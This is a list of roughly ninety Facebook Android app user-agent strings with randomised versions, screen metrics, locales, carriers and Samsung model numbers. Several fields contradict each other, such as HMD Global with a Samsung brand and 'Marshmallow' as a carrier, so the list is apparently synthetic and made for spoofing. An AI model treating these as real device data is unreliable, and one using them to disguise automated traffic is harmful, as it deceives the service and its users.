"[FBAN/FB4A;FBAV/107.0.0.53.74;FBBV/90386574;FBDM/{density=1.4,width=1241,height=2201};FBLC/en_US;FBRV/26043962;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J326AZ;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/63.0.0.94.145;FBBV/33835354;FBDM/{density=4.1,width=810,height=1035};FBLC/en_GB;FBRV/24001978;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G532M;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/341.0.0.76.92;FBBV/44801490;FBDM/{density=5.2,width=1412,height=1096};FBLC/en_PK;FBRV/71566977;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J106B;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/356.0.0.82.177;FBBV/92749276;FBDM/{density=7.3,width=1227,height=2804};FBLC/en_GB;FBRV/16878421;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A105M;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/268.0.0.61.141;FBBV/61350271;FBDM/{density=4.5,width=1213,height=1867};FBLC/en_PK;FBRV/28351036;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G955N;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/146.0.0.87.74;FBBV/97485651;FBDM/{density=6.5,width=826,height=2317};FBLC/en_GB;FBRV/68224490;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G988B;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/227.0.0.43.29;FBBV/56115960;FBDM/{density=7.9,width=583,height=1809};FBLC/en_GB;FBRV/80102663;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A307FN;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/405.0.0.53.184;FBBV/79888925;FBDM/{density=3.5,width=829,height=1366};FBLC/en_GB;FBRV/11192346;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M526B;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/375.0.0.71.55;FBBV/37826169;FBDM/{density=9.1,width=1353,height=1749};FBLC/en_US;FBRV/48948288;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G5500;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/139.0.0.62.35;FBBV/46513849;FBDM/{density=3.8,width=1356,height=1700};FBLC/en_PK;FBRV/77380189;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9100;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/10.0.0.19.144;FBBV/55518828;FBDM/{density=1.4,width=553,height=1480};FBLC/en_GB;FBRV/30956449;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G611L;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/148.0.0.73.103;FBBV/54443532;FBDM/{density=8.1,width=1129,height=1227};FBLC/en_GB;FBRV/79607651;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N750;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/11.0.0.87.38;FBBV/88566641;FBDM/{density=9.4,width=1395,height=2950};FBLC/en_PK;FBRV/56273833;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A605GN;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/171.0.0.5.25;FBBV/34024354;FBDM/{density=2.5,width=1401,height=1641};FBLC/en_PK;FBRV/96694404;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N971N;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/267.0.0.84.113;FBBV/74897381;FBDM/{density=2.8,width=626,height=2590};FBLC/en_PK;FBRV/79134676;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A715W;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/376.0.0.13.24;FBBV/89229015;FBDM/{density=7.8,width=1270,height=1832};FBLC/en_US;FBRV/98619792;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J610FN;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/386.0.0.92.135;FBBV/26952758;FBDM/{density=7.4,width=897,height=1815};FBLC/en_GB;FBRV/75318106;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C1158;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/81.0.0.24.117;FBBV/40719064;FBDM/{density=1.2,width=1358,height=2674};FBLC/en_GB;FBRV/18131875;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A908B;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/241.0.0.24.66;FBBV/69034337;FBDM/{density=6.1,width=904,height=2687};FBLC/en_US;FBRV/16677727;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J120FN;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/391.0.0.25.123;FBBV/52095687;FBDM/{density=1.2,width=1390,height=2345};FBLC/en_PK;FBRV/71726683;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J415G;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/345.0.0.5.155;FBBV/34611548;FBDM/{density=9.1,width=600,height=2220};FBLC/en_US;FBRV/13677912;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A025M;FBSV/9.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/321.0.0.51.94;FBBV/43304697;FBDM/{density=9.5,width=904,height=1559};FBLC/en_GB;FBRV/78170997;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A525M;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/228.0.0.54.57;FBBV/56229023;FBDM/{density=3.8,width=1473,height=2201};FBLC/en_GB;FBRV/26939001;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J100FN;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/402.0.0.20.168;FBBV/81853143;FBDM/{density=2.1,width=830,height=1326};FBLC/en_GB;FBRV/23148554;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A107F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/209.0.0.51.92;FBBV/35813110;FBDM/{density=8.2,width=1394,height=1600};FBLC/en_GB;FBRV/44646663;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A750FN;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/322.0.0.65.175;FBBV/27261599;FBDM/{density=7.6,width=931,height=2967};FBLC/en_US;FBRV/92360276;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J400F;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/376.0.0.78.183;FBBV/30391611;FBDM/{density=4.9,width=549,height=2815};FBLC/en_PK;FBRV/89963421;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A736B;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/241.0.0.93.172;FBBV/65999179;FBDM/{density=7.7,width=514,height=2701};FBLC/en_PK;FBRV/35355663;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G928C;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/52.0.0.92.149;FBBV/94545975;FBDM/{density=2.4,width=745,height=2659};FBLC/en_GB;FBRV/23168533;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A528B;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/405.0.0.96.191;FBBV/61871760;FBDM/{density=8.4,width=771,height=2105};FBLC/en_PK;FBRV/56043970;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J200G;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/115.0.0.44.22;FBBV/35142398;FBDM/{density=9.8,width=1203,height=1086};FBLC/en_GB;FBRV/94176759;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J250M;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/307.0.0.49.23;FBBV/15819855;FBDM/{density=3.1,width=1490,height=2399};FBLC/en_PK;FBRV/52760436;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920K;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/293.0.0.65.123;FBBV/23313866;FBDM/{density=9.8,width=1149,height=2667};FBLC/en_US;FBRV/61676952;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A510F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/54.0.0.79.126;FBBV/62779392;FBDM/{density=2.8,width=552,height=2536};FBLC/en_GB;FBRV/22739076;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S901U;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/389.0.0.63.198;FBBV/31811467;FBDM/{density=9.3,width=917,height=2036};FBLC/en_PK;FBRV/16907639;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A536V;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/12.0.0.99.97;FBBV/98810379;FBDM/{density=9.5,width=865,height=2115};FBLC/en_GB;FBRV/25460111;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A022G;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/210.0.0.5.35;FBBV/43102974;FBDM/{density=7.4,width=1047,height=1245};FBLC/en_US;FBRV/60420937;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J337AZ;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/179.0.0.32.196;FBBV/52154133;FBDM/{density=6.2,width=923,height=2263};FBLC/en_GB;FBRV/20213699;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N915S;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/170.0.0.81.147;FBBV/32218659;FBDM/{density=5.3,width=917,height=1180};FBLC/en_GB;FBRV/35985614;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M022M;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/276.0.0.53.171;FBBV/89988458;FBDM/{density=4.1,width=884,height=1358};FBLC/en_GB;FBRV/17559208;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J700P;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/13.0.0.23.79;FBBV/86824800;FBDM/{density=5.5,width=1175,height=2437};FBLC/en_GB;FBRV/89499598;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J105Y;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/196.0.0.55.17;FBBV/64266935;FBDM/{density=7.8,width=1302,height=1079};FBLC/en_GB;FBRV/66369317;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J700M;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/261.0.0.20.19;FBBV/61823815;FBDM/{density=1.4,width=515,height=2923};FBLC/en_PK;FBRV/43052328;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A315G;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/43.0.0.87.154;FBBV/92512181;FBDM/{density=6.1,width=519,height=2338};FBLC/en_US;FBRV/67265688;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung W2022;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/98.0.0.65.174;FBBV/48982198;FBDM/{density=1.4,width=1410,height=1664};FBLC/en_GB;FBRV/19278083;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N930x;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/42.0.0.13.159;FBBV/89029776;FBDM/{density=3.3,width=1028,height=2395};FBLC/en_US;FBRV/20884652;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C105K;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/355.0.0.57.177;FBBV/27415945;FBDM/{density=7.6,width=563,height=1168};FBLC/en_GB;FBRV/45960192;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G986W;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/55.0.0.92.16;FBBV/29413873;FBDM/{density=5.3,width=873,height=1408};FBLC/en_GB;FBRV/12604318;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G610Y;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/402.0.0.73.1;FBBV/29526865;FBDM/{density=5.4,width=1348,height=1018};FBLC/en_PK;FBRV/15889484;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G110H;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/290.0.0.75.152;FBBV/47801922;FBDM/{density=9.2,width=548,height=2418};FBLC/en_PK;FBRV/17887654;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J327T1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/363.0.0.19.155;FBBV/49292177;FBDM/{density=4.6,width=1103,height=1324};FBLC/en_US;FBRV/51805973;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M526B;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/221.0.0.91.120;FBBV/33202813;FBDM/{density=2.6,width=1251,height=1171};FBLC/en_PK;FBRV/61355185;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S908E;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/195.0.0.46.100;FBBV/79300424;FBDM/{density=8.5,width=868,height=1694};FBLC/en_PK;FBRV/20013437;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727T1;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/281.0.0.55.193;FBBV/52283589;FBDM/{density=8.6,width=557,height=2628};FBLC/en_PK;FBRV/26921271;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J320F;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/219.0.0.69.84;FBBV/96600445;FBDM/{density=1.2,width=790,height=1940};FBLC/en_GB;FBRV/79213111;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N915S;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/84.0.0.85.106;FBBV/13750529;FBDM/{density=5.6,width=1063,height=1538};FBLC/en_US;FBRV/24255917;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A516B;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/299.0.0.62.47;FBBV/26792995;FBDM/{density=4.5,width=1231,height=2012};FBLC/en_GB;FBRV/12506469;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C9000;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/145.0.0.20.69;FBBV/15181299;FBDM/{density=3.3,width=912,height=1554};FBLC/en_US;FBRV/31620996;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G7509;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/195.0.0.11.159;FBBV/37820904;FBDM/{density=5.9,width=881,height=1489};FBLC/en_PK;FBRV/90305383;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N975F;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/77.0.0.14.178;FBBV/64855153;FBDM/{density=9.6,width=1213,height=2790};FBLC/en_PK;FBRV/71589463;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G986U1;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/360.0.0.69.100;FBBV/74538767;FBDM/{density=6.4,width=1236,height=1479};FBLC/en_GB;FBRV/74962439;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A217M;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/102.0.0.18.147;FBBV/12388843;FBDM/{density=4.7,width=1393,height=1295};FBLC/en_PK;FBRV/45525861;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A405FM;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/228.0.0.13.10;FBBV/48720515;FBDM/{density=8.7,width=1214,height=1427};FBLC/en_US;FBRV/91846078;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A115U;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/375.0.0.76.24;FBBV/15645249;FBDM/{density=2.7,width=760,height=2116};FBLC/en_PK;FBRV/38257441;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G990U;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/187.0.0.15.75;FBBV/35468524;FBDM/{density=8.4,width=1500,height=2594};FBLC/en_PK;FBRV/11633691;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A022F;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/126.0.0.39.165;FBBV/82636753;FBDM/{density=9.5,width=1043,height=2409};FBLC/en_US;FBRV/88424843;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G965F;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/263.0.0.46.13;FBBV/74145254;FBDM/{density=2.5,width=1463,height=2010};FBLC/en_GB;FBRV/82193592;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A707F;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/31.0.0.9.50;FBBV/50665231;FBDM/{density=5.5,width=1071,height=1390};FBLC/en_GB;FBRV/18338337;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C5010;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/39.0.0.99.134;FBBV/52661316;FBDM/{density=4.6,width=1178,height=1323};FBLC/en_PK;FBRV/43882459;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G930V;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/195.0.0.48.123;FBBV/74025059;FBDM/{density=2.7,width=572,height=1335};FBLC/en_PK;FBRV/60231433;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung F127G;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/329.0.0.24.160;FBBV/69220110;FBDM/{density=4.3,width=609,height=2591};FBLC/en_US;FBRV/80923210;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727V;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/275.0.0.99.158;FBBV/65778053;FBDM/{density=7.2,width=1167,height=1752};FBLC/en_US;FBRV/78187841;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A605K;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/174.0.0.26.57;FBBV/23200631;FBDM/{density=7.5,width=1305,height=2216};FBLC/en_US;FBRV/81721174;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G313HU;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/227.0.0.81.29;FBBV/90382514;FBDM/{density=4.7,width=550,height=2413};FBLC/en_US;FBRV/14362628;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G531H;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/263.0.0.40.189;FBBV/33240195;FBDM/{density=3.8,width=526,height=2372};FBLC/en_GB;FBRV/97851837;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J111F;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/33.0.0.40.177;FBBV/79912432;FBDM/{density=5.5,width=744,height=2258};FBLC/en_US;FBRV/25269010;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J200H;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/98.0.0.98.178;FBBV/96758773;FBDM/{density=2.2,width=769,height=1500};FBLC/en_PK;FBRV/26020886;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M107F;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/433.0.0.35.33;FBBV/58307951;FBDM/{density=9.7,width=778,height=1293};FBLC/en_US;FBRV/51918162;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A605K;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/188.0.0.52.156;FBBV/81084100;FBDM/{density=3.3,width=1269,height=1307};FBLC/en_PK;FBRV/46519448;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A032M;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/162.0.0.54.114;FBBV/42916957;FBDM/{density=6.6,width=1118,height=2751};FBLC/en_US;FBRV/29943152;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N970U1;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/308.0.0.62.132;FBBV/30409504;FBDM/{density=4.1,width=1254,height=1997};FBLC/en_PK;FBRV/74861758;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E236B;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/322.0.0.91.135;FBBV/13101113;FBDM/{density=8.7,width=1115,height=2101};FBLC/en_US;FBRV/42310530;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J3109;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/399.0.0.6.44;FBBV/52737897;FBDM/{density=2.8,width=1022,height=2729};FBLC/en_US;FBRV/25359992;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N920I;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/199.0.0.99.13;FBBV/94827805;FBDM/{density=4.5,width=797,height=2463};FBLC/en_PK;FBRV/70432027;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A605F;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/230.0.0.24.36;FBBV/21107367;FBDM/{density=4.2,width=932,height=2239};FBLC/en_PK;FBRV/51624941;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3518;FBSV/9.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/319.0.0.67.19;FBBV/57920996;FBDM/{density=9.9,width=501,height=1176};FBLC/en_GB;FBRV/53221339;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C7100;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/236.0.0.25.87;FBBV/25504103;FBDM/{density=7.5,width=1323,height=1034};FBLC/en_PK;FBRV/33848650;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9009;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/416.0.0.74.196;FBBV/88499742;FBDM/{density=4.7,width=516,height=2584};FBLC/en_US;FBRV/28500028;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G930A;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/396.0.0.25.112;FBBV/80180320;FBDM/{density=5.9,width=1014,height=2903};FBLC/en_PK;FBRV/15776129;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9008V;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/314.0.0.48.163;FBBV/39103394;FBDM/{density=6.7,width=656,height=2802};FBLC/en_PK;FBRV/13706753;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G8850;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
